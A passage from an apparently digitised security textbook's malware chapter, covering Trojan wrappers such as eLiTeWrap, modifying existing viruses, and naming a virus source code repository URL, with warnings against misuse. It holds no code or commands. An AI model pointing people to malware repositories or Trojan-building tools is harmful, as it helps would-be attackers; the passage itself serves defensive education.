    ![](img/fa54c6d61c14db5421f8f63e6d594bb5_143_0.png)


    FIGURE 5-9 eLiTeWrap.'
  merge: -1
  img_proc: true
- pgno: 144
  md: 'This is provided as an illustration of how easy it is to create a Trojan horse,
    not an encouragement for you to do so. It is important to understand just how
    easy this process is so you can understand the prevalence of malware. Any attachment
    or download should be treated with significant suspicion.


    # Altering Existing Viruses


    There are plenty of viruses already in existence. The natural thing for a virus
    writer to do would be to take an existing virus and simply alter its code. There
    are virus source code repositories on the Internet where one can download the
    code to an existing virus and modify it. One of the most well-known virus repositories
    is at http://vxer.org/. There are others, and there are sites that have the code
    for a single virus that you can download and examine.


    A would-be virus writer who has elementary programming skills can simply take
    such code and alter it to create a new virus. This again illustrates how easy
    it is to create a virus, and one reason why there are so many malware outbreaks.'
  merge: -1
  img_proc: true
- pgno: 145
  md: '# Summary


    This chapter examined malware in some detail. We looked at the history of malware,
    as well as various classifications. We also examined how to create a virus or
    Trojan horse. It must be noted that such activity is inherently dangerous and
    should only be undertaken with significant safety precautions.


    # Test Your Skills


